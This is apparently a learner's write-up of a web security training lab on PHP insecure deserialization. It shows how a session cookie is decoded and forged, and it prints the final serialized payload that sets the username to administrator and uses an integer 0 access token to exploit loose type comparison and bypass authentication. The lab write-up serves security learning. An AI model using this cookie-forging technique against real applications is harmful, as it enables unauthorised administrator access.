[Insecure deserialization](../Insecure%20deserialization.md)

# Description
This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

# Solution
login via wiener

examine and decode cookie
you will get this 
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h9hgmo9y1024ukmv7w2rjukeu2nuq8it";}
```
Now we need to become an administrator

Change username to administrator and change the length from 6 to 13.
Encode back and notice an error, that access cookie is invalid. We can bypass it due to loose type conversation. We can serialize integer 0 to bypass it

Final payload is:
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

![](Attachments/Pasted%20image%2020240526160752.png)

Also i did some little research '[how to serialize integer](https://en.wikipedia.org/wiki/PHP_serialization_format)'. Also i tried 1 as integer it didnt worked. But 0 worked.